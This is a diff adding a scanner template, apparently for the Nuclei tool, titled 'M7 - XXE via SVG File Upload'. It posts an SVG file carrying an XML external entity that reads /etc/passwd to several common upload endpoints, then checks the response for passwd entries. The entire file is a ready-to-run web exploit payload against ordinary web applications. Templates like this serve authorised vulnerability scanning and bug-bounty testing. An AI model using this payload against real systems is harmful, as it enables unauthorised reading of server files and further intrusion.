@@ -1,0 +1,37 @@
+id: m7-xxe-svg-upload
+info:
+  name: M7 - XXE via SVG File Upload
+  author: Sharlix
+  severity: high
+  description: XXE via SVG file upload - often missed by scanners
+  tags: xxe,svg,upload,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/avatar"
+      - "{{BaseURL}}/image/upload"
+      - "{{BaseURL}}/file/upload"
+
+    headers:
+      Content-Type: multipart/form-data; boundary=----m7boundary
+
+    body: |
+      ------m7boundary
+      Content-Disposition: form-data; name="file"; filename="m7.svg"
+      Content-Type: image/svg+xml
+
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <svg xmlns="http://www.w3.org/2000/svg">
+        <text>&xxe;</text>
+      </svg>
+      ------m7boundary--
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:x?:\d+:\d+:"
+        part: body
